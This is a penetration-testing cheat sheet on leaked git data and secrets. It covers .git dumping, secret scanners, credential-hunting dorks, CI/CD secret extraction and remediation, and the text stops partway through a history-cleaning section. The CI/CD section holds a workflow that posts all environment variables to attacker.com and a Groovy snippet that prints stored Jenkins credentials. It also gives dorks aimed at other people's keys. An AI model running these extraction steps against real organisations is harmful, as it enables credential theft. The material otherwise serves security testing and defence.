---
title: Git & Secrets Leak
description: Git & Secrets Leak
icon: fontawesome/brands/google
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
---


## Table of Contents

1. [Core Concepts](#1-core-concepts)
2. [Exposed .git Directory — Web Targets](#2-exposed-git-directory--web-targets)
3. [Git Forensics — Manual Techniques](#3-git-forensics--manual-techniques)
4. [Tool Arsenal](#4-tool-arsenal)
   - [4.1 Dumpers & Extractors](#41-dumpers--extractors)
   - [4.2 Secrets Scanners (CLI)](#42-secrets-scanners-cli)
   - [4.3 GitHub/GitLab Recon Tools](#43-githubgitlab-recon-tools)
   - [4.4 Web / OSINT Tools](#44-web--osint-tools)
5. [TruffleHog — Deep Dive](#5-trufflehog--deep-dive)
6. [Gitleaks — Deep Dive](#6-gitleaks--deep-dive)
7. [GitGuardian (ggshield) — Deep Dive](#7-gitguardian-ggshield--deep-dive)
8. [GitHub Dorks & Search Operators](#8-github-dorks--search-operators)
9. [Google Dorks — Git Exposures](#9-google-dorks--git-exposures)
10. [CI/CD Platform Secrets Extraction](#10-cicd-platform-secrets-extraction)
    - [10.1 GitHub Actions](#101-github-actions)
    - [10.2 GitLab CI](#102-gitlab-ci)
    - [10.3 Jenkins](#103-jenkins)
    - [10.4 CircleCI](#104-circleci)
    - [10.5 Azure DevOps (ADO)](#105-azure-devops-ado)
    - [10.6 Travis CI](#106-travis-ci)
    - [10.7 Bitbucket Pipelines](#107-bitbucket-pipelines)
11. [Nord Stream — CI/CD Secrets Extraction Tool](#11-nord-stream--cicd-secrets-extraction-tool)
12. [NPM, PyPI & Package Registry Leaks](#12-npm-pypi--package-registry-leaks)
13. [Docker Image Secrets Leaks](#13-docker-image-secrets-leaks)
14. [Common Sensitive File Targets](#14-common-sensitive-file-targets)
15. [Secret Types & Regex Patterns](#15-secret-types--regex-patterns)
16. [BFG Repo Cleaner — Remediation](#16-bfg-repo-cleaner--remediation)
17. [Pre-commit Hooks — Prevention](#17-pre-commit-hooks--prevention)
18. [Detection Evasion Techniques](#18-detection-evasion-techniques)
19. [Quick Reference Command Matrix](#19-quick-reference-command-matrix)
20. [Remediation Checklist](#20-remediation-checklist)

---

## 1. Core Concepts

| Concept | Description |
|---|---|
| **Secret** | A credential used by a machine to authenticate: API keys, tokens, passwords, private keys, connection strings |
| **Entropy** | Measure of randomness; high-entropy strings are likely secrets (Shannon entropy > 4.5 for base64, > 3.0 for hex) |
| **Commit History** | Git stores every version of every file — deleted secrets often persist in history |
| **Loose Objects** | SHA1-addressed blobs in `.git/objects/` — recoverable even if files are deleted |
| **Pack Files** | Compressed bundles of objects in `.git/objects/pack/` |
| **Refs** | Branch/tag pointers living in `.git/refs/` |
| **ORIG_HEAD** | Saved prior HEAD state — can expose earlier branches with credentials |
| **Stash** | `git stash` saves work-in-progress; stashed files often contain raw credentials |
| **CI/CD Variables** | Secrets injected at pipeline runtime via env vars; can be extracted via pipeline abuse |
| **Secrets Sprawl** | Uncontrolled spread of credentials across repos, configs, logs, and CI platforms |

---

## 2. Exposed .git Directory — Web Targets

### Detection

```bash
# Direct access probe
curl -si https://target.com/.git/HEAD
curl -si https://target.com/.git/config

# Common paths to check
/.git/HEAD
/.git/config
/.git/index
/.git/COMMIT_EDITMSG
/.git/logs/HEAD
/.git/refs/heads/main
/.git/objects/info/packs
/.git/packed-refs
/.git/ORIG_HEAD
/.git/stash

# Check HTTP response: 200 OK → exposed
# Expected content of HEAD: "ref: refs/heads/main"
```

### Directory Listing vs. Traversal Disabled

| Scenario | Tool | Notes |
|---|---|---|
| Directory listing **enabled** | `GitTools/Dumper` | Recursively downloads all files |
| Directory listing **disabled** | `GitDump (Ebryx)` | Brute-forces object names from index/refs |
| Partial exposure | `git-dumper (holly-hacker)` | Parallel fetching, >10× speedup |
| Any scenario | `Gitjacker` | Recovers significant portions even without listings |

### Full Extraction Workflow (GitTools)

```bash
# Step 1: Clone GitTools
git clone https://github.com/internetwache/GitTools
cd GitTools

# Step 2: Dump the .git directory
./Dumper/gitdumper.sh https://target.com/.git/ /tmp/dump/

# Step 3: Reconstruct the working tree
./Extractor/extractor.sh /tmp/dump/ /tmp/extracted/

# Step 4: Checkout files
cd /tmp/dump && git checkout -- .

# Step 5: Review history
git log --oneline --all
git log --graph --decorate --all

# Step 6: Scan for secrets
gitleaks detect --source=/tmp/dump --no-git -v
trufflehog filesystem --directory=/tmp/dump
```

### git-dumper (2024 rewrite — faster)

```bash
pip install git-dumper
git-dumper https://target.com/.git/ ./output/
cd output && git checkout -- .
```

### GitDump (traversal disabled)

```bash
git clone https://github.com/Ebryx/GitDump
python3 GitDump/git-dump.py https://target.com/.git/ ./dump/
cd dump && git checkout -- .
```

---

## 3. Git Forensics — Manual Techniques

### Inspect All Commits and Diffs

```bash
# Full commit history across all branches
git log --all --full-history --oneline

# Show diff of each commit
git log -p --all

# Search commit messages for keywords
git log --all --grep="password"
git log --all --grep="secret"
git log --all --grep="key"
git log --all --grep="token"
git log --all --grep="credentials"

# Search file content across all commits
git grep -i "password" $(git rev-list --all)
git grep -i "api_key" $(git rev-list --all)

# Show a specific commit's changes
git show <COMMIT_HASH>

# Show file at a specific commit
git show <COMMIT_HASH>:path/to/file
```

### Object Inspection

```bash
# List all blob objects
git cat-file --batch-check --batch-all-objects | grep blob

# Read the content of an object
git cat-file -p <SHA1_HASH>

# List all objects with their types
git cat-file --batch-check < <(git rev-list --all --objects | awk '{print $1}')
```

### Recovering Deleted Files

```bash
# List files ever tracked (including deleted)
git log --all --full-history -- "**/secrets*"
git log --all --full-history -- "**/.env*"
git log --all --full-history -- "**/config*"

# Restore a deleted file from history
git checkout <COMMIT_HASH>~1 -- path/to/deleted/file

# Check stash
git stash list
git stash show -p stash@{0}

# Check all refs (including remote-tracking and stash)
git for-each-ref --format='%(refname)' refs/
```

### Config & Hooks

```bash
# Read repository config (may contain remote URLs with credentials)
cat .git/config
git config -l

# Check for rogue hooks (can contain secrets or exfiltration code)
ls -la .git/hooks/
cat .git/hooks/pre-receive
cat .git/hooks/post-commit
```

---

## 4. Tool Arsenal

### 4.1 Dumpers & Extractors

| Tool | Description | URL |
|---|---|---|
| **GitTools (Dumper + Extractor)** | Classic .git dumper suite | `https://github.com/internetwache/GitTools` |
| **git-dumper** | 2024 rewrite; parallel fetching (10×+ faster) | `https://github.com/arthaud/git-dumper` |
| **GitDump (Ebryx)** | Works even when directory traversal is disabled | `https://github.com/Ebryx/GitDump` |
| **Gitjacker** | Recovers repos from sites without directory listings | `https://github.com/liamg/gitjacker` |
| **githack** | Python-based .git downloader | `https://github.com/OwenChia/githack` |
| **Goop** | Alternative .git dumper | `https://github.com/deletescape/goop` |
| **DumpsterDiver** | Searches archives/dumps for sensitive data | `https://github.com/securing/DumpsterDiver` |

### 4.2 Secrets Scanners (CLI)

| Tool | Language | Key Strength | URL |
|---|---|---|---|
| **TruffleHog v3** | Go | 800+ detectors, live secret verification | `https://github.com/trufflesecurity/trufflehog` |
| **Gitleaks** | Go | Fast, lightweight, custom regex, CI-friendly | `https://github.com/gitleaks/gitleaks` |
| **ggshield (GitGuardian CLI)** | Python | Enterprise-grade, 350+ secret types | `https://github.com/GitGuardian/ggshield` |
| **detect-secrets (Yelp)** | Python | Baseline-based, audit mode | `https://github.com/Yelp/detect-secrets` |
| **git-secrets (AWS Labs)** | Shell | AWS-specific, pre-commit integration | `https://github.com/awslabs/git-secrets` |
| **SecretScanner** | Go | Container and filesystem scanning | `https://github.com/deepfence/SecretScanner` |
| **shhgit** | Go | Realtime GitHub/GitLab/Bitbucket monitoring | `https://github.com/eth0izzle/shhgit` |
| **Semgrep Secrets** | Python | SAST + secrets, rule-based | `https://semgrep.dev/` |
| **noseyparker** | Rust | Extremely fast, large-scale scanning | `https://github.com/praetorian-inc/noseyparker` |
| **repo-security-scanner** | Go | GitHub-focused credential finder | `https://github.com/UKHomeOffice/repo-security-scanner` |
| **gitallsecrets** | Go | Scan org repos + analyze with Trufflehog | `https://github.com/anshumanbh/gitallsecrets` |
| **git-secret-scanner** | Python | Combines TruffleHog + Gitleaks results | `https://github.com/padok-team/git-secret-scanner` |
| **Whispers** | Python | Static analysis for hardcoded credentials | `https://github.com/Skyscanner/whispers` |

### 4.3 GitHub/GitLab Recon Tools

| Tool | Description | URL |
|---|---|---|
| **GitRob** | Scans GitHub org members and repos for sensitive files | `https://github.com/michenriksen/gitrob` |
| **GitHound** | Hunts exposed secrets across GitHub search results | `https://github.com/tillson/git-hound` |
| **GitGot (BishopFox)** | Fast GitHub search for sensitive data via search API | `https://github.com/BishopFox/GitGot` |
| **Gitrob** | Finds potentially sensitive files across GitHub orgs | `https://github.com/michenriksen/gitrob` |
| **Gitscraper** | Scrapes GitHub naming conventions for pentest wordlists | `https://github.com/adamtlangley/gitscraper` |
| **gitGraber** | Realtime GitHub monitor for sensitive data | `https://github.com/hisxo/gitGraber` |
| **Masscan-ng + Github** | Combine masscan results with GitHub org recon | — |
| **Nord Stream** | Extract CI/CD secrets from GitHub/GitLab/AzDO | `https://github.com/synacktiv/nord-stream` |

### 4.4 Web / OSINT Tools

| Tool / Platform | Type | Description |
|---|---|---|
| **GitGuardian Dashboard** | SaaS | Monitors public GitHub in real-time for leaked secrets |
| **GitHub Secret Scanning** | Native | Built-in GitHub feature; auto-notifies on 200+ partner patterns |
| **GitLab Secret Detection** | Native | Push protection + pipeline scanning |
| **grep.app** | Web | Full-text search across public GitHub repos |
| **sourcegraph.com** | Web | Advanced code search across multiple platforms |
| **publicwww.com** | Web | Source code search engine; find leaked credentials in HTML/JS |
| **SearchCode** | Web | Search code by keyword/regex across GitHub/Bitbucket/GitLab |
| **Shodan** | Web | Find exposed Jenkins, GitLab, Gitea instances |
| **Censys** | Web | TLS/cert-based discovery of exposed git services |
| **FOFA** | Web | Chinese search engine; finds exposed git repos and CI panels |
| **Hunter.io** | Web | Email/org reconnaissance, pivot into code search |
| **IntelX (Intelligence X)** | Web | Searches pastes and dark web for leaked code/credentials |
| **Have I Been Pwned** | Web | Check if org emails appear in breach data |
| **Pastebin / GitHub Gist** | Web | Common paste targets; search with dorks |
| **DeHashed** | Web | Credential database search |
| **LeakIX** | Web | Indexes misconfigured services including exposed .git |

---

## 5. TruffleHog — Deep Dive

### Installation

```bash
# Script install
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh \
  | sh -s -- -b /usr/local/bin

# Go install
go install github.com/trufflesecurity/trufflehog/v3@latest

# Docker
docker pull trufflesecurity/trufflehog:latest

# Homebrew (macOS)
brew install trufflehog
```

### Git Repository Scanning

```bash
# Scan remote repo (GitHub/GitLab/any git host)
trufflehog git https://github.com/target/repo

# Scan remote repo — only show verified secrets
trufflehog git https://github.com/target/repo --only-verified

# Scan local repository
trufflehog git file:///path/to/local/repo

# Scan current directory (relative path)
trufflehog git file://.

# Scan specific branch
trufflehog git https://github.com/target/repo --branch=dev

# Scan since a specific commit
trufflehog git https://github.com/target/repo --since-commit=<HASH>

# Scan local filesystem (non-git)
trufflehog filesystem --directory=/path/to/dir

# Scan with no update check
trufflehog filesystem . --no-update --only-verified
```

### GitHub Platform Scanning

```bash
# Scan a single GitHub repo (includes issues/PR comments)
trufflehog github --repo=https://github.com/target/repo

# Include issue comments
trufflehog github --repo=https://github.com/target/repo --issue-comments

# Include PR comments
trufflehog github --repo=https://github.com/target/repo --pr-comments

# Scan entire GitHub org
trufflehog github --org=TargetOrg --token=$GITHUB_TOKEN

# Scan GitHub user
trufflehog github --user=targetuser --token=$GITHUB_TOKEN

# Scan GitHub with all repos
trufflehog github --org=TargetOrg --token=$GITHUB_TOKEN --only-verified
```

### GitLab Scanning

```bash
# Scan a GitLab repo
trufflehog gitlab --repo=https://gitlab.com/target/repo --token=$GITLAB_TOKEN

# Scan GitLab group
trufflehog gitlab --endpoint=https://gitlab.com --token=$GITLAB_TOKEN
```

### Other Sources

```bash
# S3 Bucket
trufflehog s3 --bucket=target-bucket --role-arn=arn:aws:iam::...

# Docker image
trufflehog docker --image=targetorg/targetimage:latest

# CircleCI logs
trufflehog circleci --token=$CIRCLECI_TOKEN

# Scan a Syslog file
trufflehog syslog --address=0.0.0.0:514 --protocol=tcp

# Scan GCS bucket
trufflehog gcs --project-id=your-project --cloud-environment

# Scan Postman workspace
trufflehog postman --token=$POSTMAN_API_TOKEN

# Scan Slack workspace
trufflehog slack --token=$SLACK_TOKEN
```

### Output Flags

```bash
--only-verified       # Show only live/validated secrets
--fail                # Exit code 183 if secrets found (for CI)
--json                # JSON output
--no-update           # Don't check for updates
--concurrency=10      # Parallel workers
--log-level=debug     # Verbose logging
```

---

## 6. Gitleaks — Deep Dive

### Installation

```bash
# Homebrew
brew install gitleaks

# Go install
go install github.com/gitleaks/gitleaks/v8@latest

# Download binary (Linux x64)
wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_linux_x64.tar.gz
tar -xzf gitleaks_linux_x64.tar.gz

# Docker
docker run --rm -v $(pwd):/repo zricethezav/gitleaks:latest detect --source=/repo
```

### Core Commands

```bash
# Detect secrets in current git repo
gitleaks detect

# Verbose output
gitleaks detect -v

# Scan with secret redaction (safe logging)
gitleaks detect -v --redact --no-banner

# Scan a specific directory (non-git)
gitleaks detect --source=/path/to/dir --no-git -v

# Scan a remote URL (via cloning)
gitleaks detect --source=https://github.com/target/repo

# Output results to file
gitleaks detect --report-path=report.json --report-format=json

# Output as SARIF (for GitHub Code Scanning)
gitleaks detect --report-format=sarif --report-path=gitleaks.sarif

# Protect mode: check staged changes (pre-commit)
gitleaks protect --staged

# Scan with baseline (ignore previously known secrets)
gitleaks detect --baseline-path=baseline.json

# Scan since a specific commit
gitleaks detect --log-opts="<HASH>..HEAD"

# Scan specific branch
gitleaks detect --log-opts="origin/dev..HEAD"
```

### Custom Configuration (gitleaks.toml)

```toml
[extend]
useDefault = true         # Include all built-in rules

[[rules]]
id          = "custom-internal-key"
description = "Custom Internal API Key"
regex       = '''CORP-[0-9A-Z]{32}'''
tags        = ["apikey", "internal"]

[[rules]]
id          = "jwt-token"
description = "JWT Token"
regex       = '''eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'''
tags        = ["jwt"]

[allowlist]
description = "Allowlist"
regexes     = ['''EXAMPLE_KEY_DO_NOT_USE''']
paths       = ['''gitleaks.toml''', '''.*_test\.go''']
commits     = ["abc1234"]
```

```bash
gitleaks detect --config=gitleaks.toml -v
```

### CI Integration (GitHub Actions)

```yaml
# .github/workflows/gitleaks.yml
name: Gitleaks Secret Scan
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: gitleaks/gitleaks-action@v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### GitLab CI Integration

```yaml
# .gitlab-ci.yml
gitleaks:
  image: zricethezav/gitleaks:latest
  script:
    - gitleaks detect --verbose --source . --exit-code 1
  allow_failure: false
```

---

## 7. GitGuardian (ggshield) — Deep Dive

### Installation

```bash
pip install ggshield
ggshield auth login   # Authenticate with API key
```

### Scanning

```bash
# Scan a local repository
ggshield secret scan repo .

# Scan a specific commit range
ggshield secret scan commit-range HEAD~10..HEAD

# Scan pre-staged changes (pre-commit hook)
ggshield secret scan pre-commit

# Scan a file or directory
ggshield secret scan path /path/to/file

# Scan a Docker image
ggshield secret scan docker nginx:latest

# Scan CI environment variables
ggshield secret scan ci

# Output as JSON
ggshield secret scan repo . --json-output output.json
```

### Install as Pre-commit Hook

```bash
ggshield install -m global    # All repos on the machine
ggshield install -m local     # Current repo only
```

---

## 8. GitHub Dorks & Search Operators

> Use at `github.com/search?type=code&q=<DORK>` or with GitHub CLI / API.

### Credential Keywords

```
# General secrets
filename:.env "DB_PASSWORD"
filename:.env "SECRET_KEY"
filename:config.js "apiKey"
filename:config.py "password"
filename:settings.py "SECRET_KEY"
filename:application.properties "password"
filename:database.yml "password"

# AWS
"AKIA" extension:py
"AWS_SECRET_ACCESS_KEY" filename:.env
"aws_access_key_id" language:python

# Private keys
filename:id_rsa
filename:id_dsa
extension:pem "PRIVATE KEY"
extension:ppk "PRIVATE KEY"
extension:key "PRIVATE KEY"

# Tokens and API keys
"Authorization: Bearer" extension:json
"api_token" filename:.travis.yml
"oauth_token" language:json
"access_token" language:javascript
"slack_token" filename:.env
"stripe_key" filename:.env

# Database credentials
"jdbc:mysql://" extension:java
"mongodb+srv://" extension:js
"postgres://" extension:py
"mysql_password" filename:.env

# Cloud Platforms
"heroku_api_key"
"SENDGRID_API_KEY"
"TWILIO_AUTH_TOKEN"
"firebase" "secret"

# CI/CD
filename:.travis.yml "password"
filename:Jenkinsfile "password"
filename:.circleci "token"
```

### Org-Scoped Dorks

```
org:TargetOrg "private" filename:.env
org:TargetOrg "secret" language:yaml
org:TargetOrg extension:pem "PRIVATE KEY"
org:TargetOrg "DB_PASSWORD" filename:.env
```

### File Type Dorks

```
extension:log "password"
extension:sql "password"
extension:cfg "password"
extension:ini "password"
extension:bak "password"
filename:.htpasswd
filename:id_rsa NOT "id_rsa.pub"
filename:.npmrc "_auth"
filename:.dockercfg "auth"
filename:credentials "aws_access_key"
```

### GitHub CLI (gh) Queries

```bash
# Search with GitHub CLI
gh search code "AKIA" --owner TargetOrg --limit 100

# List all repos of an org
gh repo list TargetOrg --limit 200

# Clone all repos
gh repo list TargetOrg --json nameWithOwner -q '.[].nameWithOwner' \
  | xargs -I{} gh repo clone {}
```

---

## 9. Google Dorks — Git Exposures

```
# Direct .git exposure
inurl:"/.git" intitle:"Index of"
intitle:"index of" "/.git"
inurl:.git/HEAD filetype:txt
site:target.com inurl:.git

# Sensitive files
intitle:"index of" ".env"
intitle:"index of" "id_rsa"
intitle:"index of" "wp-config.php"
intitle:"index of" ".aws"
intitle:"index of" "credentials"
intitle:"index of" "docker-compose.yml"

# CI/CD Panels
inurl:/jenkins intitle:"Dashboard [Jenkins]"
inurl:8080 intitle:"Dashboard [Jenkins]" login
intitle:"GitLab" inurl:/users/sign_in
inurl:gitea intext:"Forgot Password"

# API Keys in public pages
site:pastebin.com "AKIA"
site:pastebin.com "password"
site:gist.github.com "api_key"
site:gist.github.com "SECRET"
```

---

## 10. CI/CD Platform Secrets Extraction

### 10.1 GitHub Actions

**Secrets exposure vectors:**
- Secrets printed to logs via `echo $SECRET`
- `env:` block exposures in workflow YAML
- Supply chain via compromised third-party Actions (e.g., CVE-2025-30066 — `tj-actions/changed-files`)
- Pull request workflow abuse (untrusted forks triggering `pull_request_target`)
- Log streaming to publicly accessible artifacts

**Enumerate secrets from workflow YAML:**
```bash
# Look for env: blocks with secret references
grep -r "secrets\." .github/workflows/
grep -r "env:" .github/workflows/
```

**Exfiltrate in a malicious workflow (simulated pentest):**
```yaml
# Proof-of-concept: leak env vars to external endpoint (authorized testing only)
- name: Test secrets access
  run: |
    echo "Secrets in env:" 
    env | grep -i secret
    curl -X POST https://attacker.com/leak -d "$(env)"
  env:
    MY_SECRET: ${{ secrets.MY_SECRET }}
```

**Defense check:**
```bash
# Search for workflows referencing pull_request_target with checkout
grep -r "pull_request_target" .github/workflows/
grep -r "checkout" .github/workflows/ -A5 | grep "ref:"
```

### 10.2 GitLab CI

**Secrets exposure vectors:**
- Variables printed in job logs
- API-accessible CI/CD variables (requires admin access)
- Group-level and instance-level variable inheritance

**API extraction (with admin token):**
```bash
# Get project CI variables
curl --header "PRIVATE-TOKEN: $ADMIN_TOKEN" \
  "https://gitlab.com/api/v4/projects/<ID>/variables"

# Get group CI variables
curl --header "PRIVATE-TOKEN: $ADMIN_TOKEN" \
  "https://gitlab.com/api/v4/groups/<ID>/variables"

# Get instance-level variables
curl --header "PRIVATE-TOKEN: $ADMIN_TOKEN" \
  "https://gitlab.com/api/v4/admin/ci/variables"
```

**Exfiltrate via malicious .gitlab-ci.yml:**
```yaml
# Authorized simulation — export job secrets
leak_test:
  script:
    - env
    - echo "$CI_JOB_TOKEN"
    - cat $TMPDIR/secrets 2>/dev/null || true
```

### 10.3 Jenkins

**Secrets exposure vectors:**
- Credentials stored in `$JENKINS_HOME/credentials.xml` (encrypted but decryptable with master key)
- Jenkinsfile with plaintext credentials
- Console output logging secrets
- Unauthenticated `/script` endpoint (Groovy console RCE)
- Exposed `http://jenkins:8080/credentials/store/system/domain/_/` 

**Decrypt Jenkins credentials:**
```bash
# If you have file access to Jenkins home
ls $JENKINS_HOME/secrets/
cat $JENKINS_HOME/secrets/master.key
cat $JENKINS_HOME/secrets/hudson.util.Secret

# Script console decryption (if /script is accessible)
println(hudson.util.Secret.decrypt("{AQAAABAAAAAg...}"))

# Decrypt via Groovy in Jenkins Script Console
import jenkins.model.*
def creds = com.cloudbees.plugins.credentials.CredentialsProvider
  .lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class, 
   Jenkins.instance, null, null)
creds.each { c -> println "${c.id}:${c.username}:${c.password}" }
```

**Unauthenticated exposure check:**
```bash
# Check for open Jenkins instance
curl http://target:8080/api/json
curl http://target:8080/credentials/
# /script endpoint (RCE if accessible)
curl http://target:8080/script
```

### 10.4 CircleCI

**Secrets exposure vectors:**
- Environment variables in project/context settings
- `.circleci/config.yml` with hardcoded values
- Build artifacts containing logs

**Scan CircleCI logs with TruffleHog:**
```bash
trufflehog circleci --token=$CIRCLECI_TOKEN
```

**Check config for secrets:**
```bash
grep -r "CIRCLE_TOKEN\|api_token\|password" .circleci/
```

### 10.5 Azure DevOps (ADO)

**Secrets exposure vectors:**
- Variable groups (Library)
- Pipeline variables (secret and non-secret)
- Service connections
- Azure Key Vault integration misconfigurations

**API extraction (with PAT):**
```bash
# List variable groups
curl -u ":$ADO_PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/distributedtask/variablegroups?api-version=7.0"

# List pipeline variables
curl -u ":$ADO_PAT" \
  "https://dev.azure.com/{org}/{project}/_apis/build/definitions?api-version=7.0"
```

**Exfiltrate via pipeline step:**
```yaml
# azure-pipelines.yml — authorized simulation
- script: |
    env | grep -i secret
    echo "##vso[task.setvariable variable=test]$(MY_SECRET)"
  env:
    MY_SECRET: $(MY_SECRET)
```

### 10.6 Travis CI

**Secrets exposure vectors:**
- Encrypted vars in `.travis.yml` can be exposed through verbose logging
- Public build logs for open-source projects
- Environment variable initialization logs showing variable names and sometimes values

**Find exposed Travis logs:**
```bash
# Travis CI public builds are at:
# https://travis-ci.com/github/{org}/{repo}/builds/{id}

# Search for leaked tokens in Travis logs via Google
site:travis-ci.com "token" "password"
```

### 10.7 Bitbucket Pipelines

**Secrets exposure vectors:**
- Repository variables (encrypted at rest but logged if `echo`-ed)
- Deployment environment variables
- `bitbucket-pipelines.yml` with hardcoded values

**Check for exposed secrets in pipeline config:**
```bash
grep -i "password\|token\|secret\|key" bitbucket-pipelines.yml
```

---

## 11. Nord Stream — CI/CD Secrets Extraction Tool

> **Tool:** `https://github.com/synacktiv/nord-stream`
> Extracts secrets from GitHub Actions, GitLab CI, and Azure DevOps by running pipeline jobs.

### Installation

```bash
git clone https://github.com/synacktiv/nord-stream
cd nord-stream
pip install -r requirements.txt
```

### Usage

```bash
# GitHub — list secrets
python3 nordstream.py github --token $GITHUB_TOKEN --org TargetOrg --list-secrets

# GitHub — extract all secrets by deploying a workflow
python3 nordstream.py github --token $GITHUB_TOKEN --org TargetOrg --extract-secret

# GitLab — extract secrets via pipeline
python3 nordstream.py gitlab --token $GITLAB_TOKEN --group TargetGroup --extract-secret

# Azure DevOps — extract secrets
python3 nordstream.py azure --token $ADO_PAT --org TargetOrg --extract-secret

# Extract secrets from a specific repo only
python3 nordstream.py github --token $GITHUB_TOKEN --repo target/repo --extract-secret
```

---

## 12. NPM, PyPI & Package Registry Leaks

```bash
# Scan a published NPM package for secrets
npm pack <package-name>
tar -xzf *.tgz
trufflehog filesystem --directory=package/

# Scan PyPI package
pip download <package-name> -d ./pkg_dir
unzip ./pkg_dir/*.whl -d ./extracted
trufflehog filesystem --directory=./extracted/

# Scan .npmrc files (may contain auth tokens)
cat ~/.npmrc
# Look for: //registry.npmjs.org/:_authToken=<TOKEN>

# Inspect NPM package.json for leaked values
grep -r "token\|password\|secret" node_modules/ --include="*.json"
```

---

## 13. Docker Image Secrets Leaks

```bash
# Scan Docker image with TruffleHog
trufflehog docker --image=targetorg/targetimage:latest

# Scan with Gitleaks (extract filesystem first)
docker create --name temp_container targetorg/targetimage:latest
docker export temp_container | tar -xC /tmp/docker_extract/
gitleaks detect --source=/tmp/docker_extract/ --no-git -v
docker rm temp_container

# Inspect image layers for secrets
docker history targetimage:latest --no-trunc
docker inspect targetimage:latest

# Dive tool — layer-by-layer inspection
dive targetimage:latest

# Check environment variables
docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' targetimage:latest

# Check CMD and ENTRYPOINT for credentials
docker inspect --format='{{.Config.Cmd}} {{.Config.Entrypoint}}' targetimage:latest

# Scan all local images
docker images --format "{{.Repository}}:{{.Tag}}" | \
  xargs -I{} trufflehog docker --image={}
```

---

## 14. Common Sensitive File Targets

When you gain access to source code, prioritize searching these files:

```
# Environment & Config
.env
.env.local
.env.production
.env.backup
config.py / config.js / config.rb / config.php
settings.py
application.properties / application.yml
appsettings.json
database.yml / database.json
secrets.yml / secrets.json

# Cloud & Infrastructure
.aws/credentials
.aws/config
~/.gcloud/credentials.json
credentials.json (GCP service accounts)
terraform.tfvars
*.tfstate (Terraform state — often contains secrets)
*.tfvars

# SSH & Keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
*.pem
*.ppk
*.key (private key files)
*.p12 / *.pfx (certificate bundles)

# Web App
wp-config.php
LocalSettings.php (MediaWiki)
.htpasswd
web.config

# Container & Orchestration
.dockercfg
~/.docker/config.json
kubeconfig
*.kubeconfig
helm/values.yaml (may contain secrets)

# Package Managers
.npmrc (npm auth tokens)
.pypirc (PyPI credentials)
.gem/credentials (RubyGems)
.mvn/settings.xml (Maven)
gradle.properties

# VCS
.git/config (may contain embedded credentials in remote URLs)

# Backup / Log files
*.bak
*.log (may contain DB credentials in connection strings)
*.sql (may contain passwords in INSERT statements)
*.dump
```

---

## 15. Secret Types & Regex Patterns

| Secret Type | Regex Pattern |
|---|---|
| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
| AWS Secret Key | `[0-9a-zA-Z/+]{40}` |
| GitHub Personal Access Token | `ghp_[A-Za-z0-9_]{36}` |
| GitHub OAuth Token | `gho_[A-Za-z0-9_]{36}` |
| GitHub Actions Token | `ghs_[A-Za-z0-9_]{36}` |
| GitLab Personal Access Token | `glpat-[0-9a-zA-Z_-]{20}` |
| Slack Bot Token | `xoxb-[0-9]{11}-[0-9]{11}-[a-zA-Z0-9]{24}` |
| Slack Webhook | `https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}` |
| Stripe API Key (live) | `sk_live_[0-9a-zA-Z]{24,99}` |
| Stripe API Key (test) | `sk_test_[0-9a-zA-Z]{24,99}` |
| Google API Key | `AIza[0-9A-Za-z_-]{35}` |
| GCP Service Account | `"type": "service_account"` |
| Twilio Account SID | `AC[a-zA-Z0-9]{32}` |
| Twilio Auth Token | `[0-9a-fA-F]{32}` |
| SendGrid API Key | `SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}` |
| JWT Token | `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` |
| RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` |
| EC Private Key | `-----BEGIN EC PRIVATE KEY-----` |
| PGP Private Key | `-----BEGIN PGP PRIVATE KEY BLOCK-----` |
| SSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` |
| Heroku API Key | `[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}` |
| NPM Auth Token | `//registry.npmjs.org/:_authToken=[A-Za-z0-9_-]+` |
| Azure Storage Key | `[a-zA-Z0-9+/]{88}==` |
| Mailgun API Key | `key-[0-9a-zA-Z]{32}` |
| Databricks Token | `dapi[a-f0-9]{32}` |
| HuggingFace Token | `hf_[A-Za-z]{34}` |
| OpenAI API Key | `sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}` |

### Entropy-Based Detection (Bash)

```bash
# High-entropy string detector (manual approach)
python3 -c "
import math, re, sys
def entropy(s):
    freq = {c: s.count(c)/len(s) for c in set(s)}
    return -sum(v * math.log2(v) for v in freq.values())
for line in sys.stdin:
    for token in re.findall(r'[A-Za-z0-9+/=_-]{20,}', line):
        e = entropy(token)
        if e > 4.0:
            print(f'[ENTROPY={e:.2f}] {token}')
" < target_file.txt
```

---

## 16. BFG Repo Cleaner — Remediation

> Remove sensitive data from Git history **after** a leak.

```bash
# Install
brew install bfg   # macOS
# or download jar from https://rtyley.github.io/bfg-repo-cleaner/

# Clone a mirror (required for BFG)
git clone --mirror https://github.com/target/repo.git

# Remove a specific file from ALL history
java -jar bfg.jar --delete-files id_rsa repo.git

# Remove files matching a pattern
java -jar bfg.jar --delete-files '*.pem' repo.git
java -jar bfg.jar --delete-files '{.env,.env.local}' repo.git

# Replace specific text (replace secrets in-place)
# Create a replacements file: echo "MYSECRETVALUE==>***REMOVED***" > replacements.txt
java -jar bfg.jar --replace-text replacements.txt repo.git

# After BFG, expire reflog and force-push
cd repo.git
git reflog expire --expire=now --all
git gc --prune=now --aggressive
git push --force
```

### git filter-repo (modern alternative)

```bash
pip install git-filter-repo

# Remove a file from all history
